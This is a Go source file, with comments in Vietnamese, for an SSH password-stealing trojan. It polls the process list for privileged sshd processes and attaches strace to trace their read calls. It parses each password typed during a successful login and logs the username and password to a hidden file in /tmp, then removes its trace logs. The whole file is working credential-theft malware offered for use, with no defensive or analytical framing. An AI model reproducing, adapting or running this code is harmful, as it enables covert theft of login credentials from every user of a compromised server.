package main

import (
	"bytes"
	"fmt"
	"io/ioutil"
	"log"
	"os"
	"os/exec"
	"regexp"
	"strconv"
	"strings"
	"time"
)

type ProcessesType [][]string

// Tao struct cua process de xem trang thai bao gom: pid, status (co dang chay hay khong), done (da hoan thanh chua)
type RunningType struct {
	pid    string
	status bool
	done   bool
}

type PidStatus []RunningType

var (
	// command get list processes va loc ra nhung processes co chua "ssh" va "[priv]"
	command = []string{"-c", "ps aux | grep ssh |awk '$13 = \"[priv]\"'"}
)

// check pid xem co nam trong list processes hay khong
func (s PidStatus) Contains(id string) bool {
	for _, v := range s {
		if v.pid == id {
			return true
		}
	}
	return false
}

// query process instance
func (s PidStatus) Query(id string) RunningType {
	for _, v := range s {
		if v.pid == id {
			return v
		}
	}
	return RunningType{
		pid:    id,
		status: false,
		done:   false,
	}
}

// add 1 process vao instance
func (s *PidStatus) Add(p RunningType) {
	*s = append(*s, p)
}

// set trang thai cua process
func (s *PidStatus) SetStatus(id string, status, done bool) {
	for i, v := range *s {
		if v.pid == id {
			(*s)[i] = RunningType{
				pid:    id,
				status: status,
				done:   done,
			}
			break
		}
	}
}

// write password vao file log_sshtrojan
func writeLog(s string) {
	f, err := os.OpenFile("/tmp/.log_sshtrojan1.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		log.Fatal(err)
	}
	if _, err := f.Write([]byte(s + "\n")); err != nil {
		log.Fatal(err)
	}
	if err := f.Close(); err != nil {
		log.Fatal(err)
	}
}

// regex string theo groups
func getParams(regEx, s string) (paramsMap map[string]string) {
	var compRegEx = regexp.MustCompile(regEx)
	match := compRegEx.FindStringSubmatch(s)
	paramsMap = make(map[string]string)
	for i, name := range compRegEx.SubexpNames() {
		if i > 0 && i <= len(match) {
			paramsMap[name] = match[i]
		}
	}
	return paramsMap
}

func splitPassword(log []string) map[string]string {
	// dong co chua password bat dau bang `read(6, "``
	reLineRead := regexp.MustCompile(`(?m)read\(6, "\\f[\\\w]+\", [\d]+\)`)
	for _, line := range log {
		for _, matchLine := range reLineRead.FindAllString(line, -1) {
			return getParams(`(?m)\"(?P<TmpPw>.*)\", (?P<CountRead>\d+)`, matchLine)
		}
	}
	return map[string]string{
		"TmpPw":     "",
		"CountRead": "",
	}
}

func getPassword(id string) string {
	// read file pid_<pid>.log
	body, err := ioutil.ReadFile("/tmp/pid_" + id + ".log")
	if err != nil {
		log.Fatalf("unable to read file: %v", err)
	}
	lines := strings.Split(string(body), "\n")
	reversedLines := []string{}
	// reverse cac dong trong file log de lay dong co chua read(6 dau tien va cung la password dung
	for i := range lines {
		tmp := lines[len(lines)-1-i]
		reversedLines = append(reversedLines, tmp)
	}
	readPassword := splitPassword(reversedLines)        // Map{TmpPw: \f\0\0\0\006123456, CountRead: 11}
	tmpPw := readPassword["TmpPw"]                      // \f\0\0\0\006123456
	count, _ := strconv.Atoi(readPassword["CountRead"]) // 11
	// dem so ki tu "/" (slash)
	countSlash := bytes.Count([]byte(tmpPw), []byte("\\"))
	// chieu dai password = CountRead - len(slash)
	lenPassword := count - countSlash
	// split de lay password
	return tmpPw[len(tmpPw)-lenPassword:]
}

// check status cua moi cap pid ke nhau
func checkLoginDone(p1, p2 []string, pids *PidStatus) {
	firstPid, _ := strconv.Atoi(p1[1])
	secondPid, _ := strconv.Atoi(p2[1])
	if firstPid+1 == secondPid {
		return
	}
	// neu process thu 2 co chua "@pts" tuc la da login thanh cong
	if strings.Contains(p2[11], "@pts") {
		password := getPassword(p1[1])
		writeLog(fmt.Sprintf("%s|%s", p1[11], password))
		// write log xong thi xet trang thai done ve true
		(*pids).SetStatus(p1[1], false, true)
	}
}

func runStrace(pid string) {
	// run struce va ghi log vao file pid_<pid>.txt
	straceCommand := []string{"-c", fmt.Sprintf("strace -e trace=read -p %s -o /tmp/pid_%s.log", pid, pid)}
	cmd := exec.Command("bash", straceCommand...)
	err := cmd.Run()
	if err != nil {
		log.Println(err.Error())
	}
}

func deleteProcessLog(id string) {
	os.Remove("/tmp/pid_" + id + ".log")
}

func main() {
	var pids PidStatus
	for {
		// chay lai sau moi 0.5s
		time.Sleep(time.Second / 2)
		cmd := exec.Command("bash", command...)
		stdout, err := cmd.Output()
		if err != nil {
			fmt.Println(err.Error())
			return
		}
		listProcesses := strings.Split(string(stdout), "\n")
		processes := ProcessesType{}
		// lay ra cac process sshd hop le
		for _, v := range listProcesses {
			fields := strings.Split(v, " ")
			if len(fields) != 13 || fields[10] != "sshd:" || fields[12] != "[priv]" {
				continue
			}
			processes = append(processes, fields)
		}
		// neu trong qua trinh thuc hien bi delay khi kill process thu 2 do server dang confirm password se xay ra hien tuong chi co 1 process sshd dang chay
		if len(processes) == 1 {
			continue
		}
		for i, v := range processes {
			if i%2 == 0 {
				if pids.Contains(v[1]) {
					// neu done thi xoa log pid
					if pids.Query(v[1]).done {
						deleteProcessLog(v[1])
						continue
					}
					// status = true chay ham checkLoginDone
					if pids.Query(v[1]).status {
						checkLoginDone(v, processes[i+1], &pids)
					} else {
						go runStrace(v[1])
						pids.SetStatus(v[1], true, false)
					}
				} else {
					// neu chua co process trong instance thi add vao
					pids.Add(RunningType{
						pid:    v[1],
						status: false,
						done:   false,
					})
				}
			}
		}
	}
}
